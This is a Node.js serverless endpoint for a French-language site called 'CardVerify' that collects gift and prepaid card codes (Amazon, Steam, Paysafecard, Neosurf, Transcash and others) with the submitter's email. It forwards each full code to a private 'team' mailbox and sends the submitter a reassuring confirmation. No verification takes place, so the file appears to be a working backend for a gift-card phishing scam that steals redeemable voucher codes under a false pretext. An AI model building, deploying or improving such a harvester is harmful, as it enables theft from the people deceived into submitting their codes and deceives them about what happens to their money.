// ================================================================
//  CardVerify — api/send.js
//  POST /api/send
// ================================================================

const { Resend } = require('resend');

var CARDS = {
  amazon:      { label: 'Amazon',      minLen: 14, maxLen: 16 },
  itunes:      { label: 'iTunes',      minLen: 16, maxLen: 16 },
  neosurf:     { label: 'Neosurf',     minLen: 10, maxLen: 10 },
  pcs:         { label: 'PCS',         minLen: 16, maxLen: 16 },
  paysafecard: { label: 'Paysafecard', minLen: 16, maxLen: 16 },
  steam:       { label: 'Steam',       minLen: 15, maxLen: 15 },
  transcash:   { label: 'Transcash',   minLen: 14, maxLen: 14 },
  vanilla:     { label: 'Vanilla',     minLen: 16, maxLen: 16 }
};

function esc(v) {
  if (typeof v !== 'string') return '';
  return v.trim()
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

function isEmail(v) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
}

function nowFR() {
  return new Date().toLocaleString('fr-FR', {
    timeZone: 'Europe/Paris',
    dateStyle: 'full',
    timeStyle: 'medium'
  });
}

function teamEmail(d) {
  var ts = nowFR();
  var rows = [
    ['Type de carte', esc(d.cardLabel)],
    ['Montant',       d.amount       ? esc(d.amount)       : '<em style="color:#6b6585">Non renseign&eacute;</em>'],
    ['Date achat',    d.purchaseDate ? esc(d.purchaseDate) : '<em style="color:#6b6585">Non renseign&eacute;e</em>'],
    ['Canal achat',   d.channel      ? esc(d.channel)      : '<em style="color:#6b6585">Non renseign&eacute;</em>'],
    ['Email',         '<a href="mailto:' + esc(d.userEmail) + '" style="color:#8b78ff">' + esc(d.userEmail) + '</a>'],
    ['Soumis le',     ts]
  ];

  var trs = rows.map(function(r) {
    return '<tr>'
      + '<td style="padding:12px 20px;border-bottom:1px solid rgba(255,255,255,0.06);color:#6b6585;font-size:12px;white-space:nowrap;font-family:Courier New,monospace;width:140px">' + r[0] + '</td>'
      + '<td style="padding:12px 20px;border-bottom:1px solid rgba(255,255,255,0.06);color:#f0eeff;font-size:13px">' + r[1] + '</td>'
      + '</tr>';
  }).join('');

  return '<!DOCTYPE html>'
    + '<html lang="fr"><head><meta charset="UTF-8"/></head>'
    + '<body style="margin:0;padding:0;background:#09090f;font-family:Inter,sans-serif;">'
    + '<table width="100%" cellpadding="0" cellspacing="0" style="background:#09090f;padding:40px 20px;">'
    + '<tr><td align="center">'
    + '<table width="580" cellpadding="0" cellspacing="0" style="max-width:580px;width:100%;">'
    + '<tr><td style="background:linear-gradient(135deg,#8b78ff,#6c5ce7);border-radius:16px 16px 0 0;padding:28px 36px;">'
    + '<h1 style="margin:0;color:#fff;font-size:20px;font-weight:800;">Nouvelle soumission CardVerify</h1>'
    + '<p style="margin:6px 0 0;color:rgba(255,255,255,0.72);font-size:13px;">' + esc(d.cardLabel) + ' &middot; ' + ts + '</p>'
    + '</td></tr>'
    + '<tr><td style="background:#0e0e1a;padding:24px 36px 0;border-left:1px solid rgba(139,120,255,0.18);border-right:1px solid rgba(139,120,255,0.18);">'
    + '<p style="margin:0 0 10px;color:#6b6585;font-size:11px;text-transform:uppercase;letter-spacing:0.1em;font-family:Courier New,monospace;">Code de la carte</p>'
    + '<div style="background:#09090f;border:2px solid #8b78ff;border-radius:12px;padding:18px 24px;text-align:center;margin-bottom:24px;">'
    + '<span style="font-family:Courier New,monospace;font-size:24px;font-weight:800;color:#8b78ff;letter-spacing:0.22em;word-break:break-all;">' + esc(d.cardCode) + '</span>'
    + '</div>'
    + '</td></tr>'
    + '<tr><td style="background:#0e0e1a;border-left:1px solid rgba(139,120,255,0.18);border-right:1px solid rgba(139,120,255,0.18);padding:0;">'
    + '<table width="100%" cellpadding="0" cellspacing="0">' + trs + '</table>'
    + '</td></tr>'
    + '<tr><td style="background:#13131f;border:1px solid rgba(139,120,255,0.14);border-top:none;border-radius:0 0 16px 16px;padding:16px 36px;text-align:center;">'
    + '<p style="margin:0;color:#6b6585;font-size:11px;font-family:Courier New,monospace;">CardVerify &mdash; Notification interne &middot; Ne pas transf&eacute;rer</p>'
    + '</td></tr>'
    + '</table>'
    + '</td></tr></table>'
    + '</body></html>';
}

function userEmail(d) {
  var ts = nowFR();
  var amtRow = d.amount
    ? '<tr>'
      + '<td style="padding:9px 0;border-bottom:1px solid rgba(255,255,255,0.05);color:#6b6585;font-size:13px;width:45%">Montant</td>'
      + '<td style="padding:9px 0;border-bottom:1px solid rgba(255,255,255,0.05);color:#63e6be;font-size:13px;font-weight:600;text-align:right">' + esc(d.amount) + '</td>'
      + '</tr>'
    : '';

  return '<!DOCTYPE html>'
    + '<html lang="fr"><head><meta charset="UTF-8"/></head>'
    + '<body style="margin:0;padding:0;background:#09090f;font-family:Inter,sans-serif;">'
    + '<table width="100%" cellpadding="0" cellspacing="0" style="background:#09090f;padding:40px 20px;">'
    + '<tr><td align="center">'
    + '<table width="540" cellpadding="0" cellspacing="0" style="max-width:540px;width:100%;">'
    + '<tr><td style="text-align:center;padding-bottom:24px;">'
    + '<div style="display:inline-block;background:linear-gradient(135deg,#8b78ff,#6c5ce7);border-radius:13px;width:48px;height:48px;line-height:52px;font-size:22px;text-align:center;">&#10022;</div>'
    + '<div style="color:#f0eeff;font-size:18px;font-weight:800;margin-top:10px;">CardVerify</div>'
    + '</td></tr>'
    + '<tr><td style="background:#0e0e1a;border:1px solid rgba(139,120,255,0.2);border-radius:18px;overflow:hidden;">'
    + '<div style="background:linear-gradient(135deg,rgba(139,120,255,0.12),rgba(108,92,231,0.08));border-bottom:1px solid rgba(139,120,255,0.15);padding:30px 32px;text-align:center;">'
    + '<div style="font-size:30px;margin-bottom:14px;">&#128591;</div>'
    + '<h1 style="margin:0 0 12px;color:#f0eeff;font-size:20px;font-weight:800;line-height:1.3;">Merci de nous faire confiance</h1>'
    + '<p style="margin:0 auto;color:#a8a3c1;font-size:14px;line-height:1.75;max-width:380px;">'
    + 'Nous avons bien re&ccedil;u votre code <strong style="color:#a594ff">' + esc(d.cardLabel) + '</strong>'
    + ' et notre &eacute;quipe le traite d&egrave;s maintenant.<br/>'
    + '<span style="color:#8b78ff;font-weight:600;">Merci de patienter</span>'
    + ' &mdash; vous serez contact&eacute; sous 24&ndash;48h.'
    + '</p>'
    + '</div>'
    + '<div style="text-align:center;padding:28px 32px 20px;">'
    + '<div style="width:60px;height:60px;border-radius:50%;background:rgba(99,230,190,0.1);border:2px solid rgba(99,230,190,0.25);margin:0 auto 14px;line-height:62px;font-size:26px;text-align:center;">&#9989;</div>'
    + '<h2 style="margin:0;color:#f0eeff;font-size:17px;font-weight:700;">Soumission confirm&eacute;e</h2>'
    + '<p style="margin:8px 0 0;color:#a8a3c1;font-size:13px;">Re&ccedil;u le ' + ts + '</p>'
    + '</div>'
    + '<div style="height:1px;background:rgba(255,255,255,0.06);margin:0 28px;"></div>'
    + '<div style="padding:20px 28px;">'
    + '<p style="margin:0 0 14px;color:#6b6585;font-size:11px;text-transform:uppercase;letter-spacing:0.1em;font-family:Courier New,monospace;">R&eacute;capitulatif</p>'
    + '<table width="100%" cellpadding="0" cellspacing="0">'
    + '<tr>'
    + '<td style="padding:9px 0;border-bottom:1px solid rgba(255,255,255,0.05);color:#6b6585;font-size:13px;width:45%;">Type de carte</td>'
    + '<td style="padding:9px 0;border-bottom:1px solid rgba(255,255,255,0.05);color:#f0eeff;font-size:13px;font-weight:600;text-align:right;">' + esc(d.cardLabel) + '</td>'
    + '</tr>'
    + amtRow
    + '<tr>'
    + '<td style="padding:9px 0;color:#6b6585;font-size:13px;">Statut</td>'
    + '<td style="padding:9px 0;color:#63e6be;font-size:13px;font-weight:600;text-align:right;">&#9989; En cours de traitement</td>'
    + '</tr>'
    + '</table>'
    + '</div>'
    + '<div style="height:1px;background:rgba(255,255,255,0.06);margin:0 28px;"></div>'
    + '<div style="padding:20px 28px 28px;">'
    + '<p style="margin:0 0 16px;color:#6b6585;font-size:11px;text-transform:uppercase;letter-spacing:0.1em;font-family:Courier New,monospace;">Prochaines &eacute;tapes</p>'
    + '<table width="100%" cellpadding="0" cellspacing="0">'
    + stepRow('1', true,  'V&eacute;rification en cours',   'Notre &eacute;quipe examine votre soumission avec soin.')
    + stepRow('2', false, 'Traitement sous 24&ndash;48h',   'Vous serez contact&eacute; si des informations compl&eacute;mentaires sont n&eacute;cessaires.')
    + stepRow('3', false, 'Confirmation finale',             'Un email vous confirmera la cl&ocirc;ture de votre demande.')
    + '</table>'
    + '</div>'
    + '</td></tr>'
    + '<tr><td style="text-align:center;padding:22px 20px 0;">'
    + '<p style="margin:0;color:#6b6585;font-size:11px;font-family:Courier New,monospace;line-height:1.7;">'
    + 'CardVerify &middot; Email automatique de confirmation<br/>'
    + 'Si vous n&#39;avez pas soumis ce code, ignorez cet email.'
    + '</p>'
    + '</td></tr>'
    + '</table>'
    + '</td></tr></table>'
    + '</body></html>';
}

function stepRow(num, filled, title, desc) {
  var bg = filled
    ? 'background:linear-gradient(135deg,#8b78ff,#6c5ce7);color:#fff;'
    : 'background:rgba(139,120,255,0.15);border:1px solid rgba(139,120,255,0.3);color:#8b78ff;';
  return '<tr>'
    + '<td style="width:34px;vertical-align:top;padding-top:2px;">'
    + '<div style="width:28px;height:28px;border-radius:50%;' + bg + 'text-align:center;line-height:28px;font-size:12px;font-weight:800;">' + num + '</div>'
    + '</td>'
    + '<td style="padding:2px 0 16px 12px;">'
    + '<div style="color:#f0eeff;font-size:13px;font-weight:600;margin-bottom:3px;">' + title + '</div>'
    + '<div style="color:#a8a3c1;font-size:12px;line-height:1.5;">' + desc + '</div>'
    + '</td>'
    + '</tr>';
}

// ── Handler principal ─────────────────────────────────────────────
module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin',  process.env.ALLOWED_ORIGIN || '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    res.setHeader('Content-Type', 'application/json');
    return res.status(405).end(JSON.stringify({ success: false, error: 'Methode non autorisee.' }));
  }

  // Parsing manuel du body si req.body absent
  var body;
  try {
    if (req.body && typeof req.body === 'object') {
      body = req.body;
    } else {
      var raw = await new Promise(function(resolve, reject) {
        var chunks = [];
        req.on('data', function(chunk) { chunks.push(chunk); });
        req.on('end',  function() { resolve(Buffer.concat(chunks).toString('utf8')); });
        req.on('error', reject);
      });
      body = raw ? JSON.parse(raw) : {};
    }
  } catch (parseErr) {
    res.setHeader('Content-Type', 'application/json');
    return res.status(400).end(JSON.stringify({ success: false, error: 'Corps de requete JSON invalide.' }));
  }

  try {
    var cardType     = (body.cardType     || '').toString().trim();
    var cardCode     = (body.cardCode     || '').toString().trim();
    var cardLabel    = (body.cardLabel    || '').toString().trim();
    var amount       = (body.amount       || '').toString().trim();
    var purchaseDate = (body.purchaseDate || '').toString().trim();
    var channel      = (body.channel      || '').toString().trim();
    var userEmail2   = (body.userEmail    || '').toString().trim().toLowerCase();

    if (!cardType || !cardCode || !userEmail2) {
      res.setHeader('Content-Type', 'application/json');
      return res.status(400).end(JSON.stringify({ success: false, error: 'Champs requis manquants : cardType, cardCode, userEmail.' }));
    }

    if (!CARDS[cardType]) {
      res.setHeader('Content-Type', 'application/json');
      return res.status(400).end(JSON.stringify({ success: false, error: 'Type de carte inconnu.' }));
    }

    if (!isEmail(userEmail2)) {
      res.setHeader('Content-Type', 'application/json');
      return res.status(400).end(JSON.stringify({ success: false, error: 'Adresse email invalide.' }));
    }

    var cfg = CARDS[cardType];
    var raw = cardCode.replace(/[\s\-]/g, '');
    if (raw.length < cfg.minLen || raw.length > cfg.maxLen) {
      res.setHeader('Content-Type', 'application/json');
      return res.status(400).end(JSON.stringify({
        success: false,
        error: 'Code ' + cfg.label + ' invalide (' + raw.length + ' car., attendu ' + cfg.minLen + '-' + cfg.maxLen + ').'
      }));
    }

    if (!process.env.RESEND_API_KEY) {
      res.setHeader('Content-Type', 'application/json');
      return res.status(500).end(JSON.stringify({ success: false, error: 'Configuration manquante : RESEND_API_KEY.' }));
    }
    if (!process.env.FROM_EMAIL) {
      res.setHeader('Content-Type', 'application/json');
      return res.status(500).end(JSON.stringify({ success: false, error: 'Configuration manquante : FROM_EMAIL.' }));
    }

    var teamAddr = process.env.TEAM_EMAIL || 'giftcardverifyteam@gmail.com';
    var fromAddr = process.env.FROM_EMAIL;

    var data = {
      cardType:     cardType,
      cardCode:     cardCode,
      cardLabel:    cardLabel || cfg.label,
      amount:       amount,
      purchaseDate: purchaseDate,
      channel:      channel,
      userEmail:    userEmail2
    };

    var resend = new Resend(process.env.RESEND_API_KEY);

    var results = await Promise.allSettled([
      resend.emails.send({
        from:    fromAddr,
        to:      teamAddr,
        subject: '[CardVerify] Nouveau code ' + data.cardLabel + ' - ' + data.userEmail,
        html:    teamEmail(data)
      }),
      resend.emails.send({
        from:    fromAddr,
        to:      data.userEmail,
        subject: 'Confirmation - Votre code ' + data.cardLabel + ' a bien ete recu',
        html:    userEmail(data)
      })
    ]);

    var teamOk = results[0].status === 'fulfilled' && !results[0].value.error;
    var userOk = results[1].status === 'fulfilled' && !results[1].value.error;

    if (!teamOk) {
      console.error('[CardVerify] Email equipe echoue:', results[0].reason || results[0].value);
      res.setHeader('Content-Type', 'application/json');
      return res.status(500).end(JSON.stringify({ success: false, error: 'Echec envoi email. Reessayez.' }));
    }
    if (!userOk) {
      console.warn('[CardVerify] Email utilisateur echoue:', results[1].reason || results[1].value);
    }

    console.log('[CardVerify] OK | ' + data.cardLabel + ' | ' + data.userEmail);

    res.setHeader('Content-Type', 'application/json');
    return res.status(200).end(JSON.stringify({
      success: true,
      message: 'Code soumis avec succes.',
      emails:  { team: teamOk, user: userOk }
    }));

  } catch (err) {
    console.error('[CardVerify] Erreur inattendue:', err.message || err);
    res.setHeader('Content-Type', 'application/json');
    return res.status(500).end(JSON.stringify({ success: false, error: 'Erreur interne. Reessayez.' }));
  }
};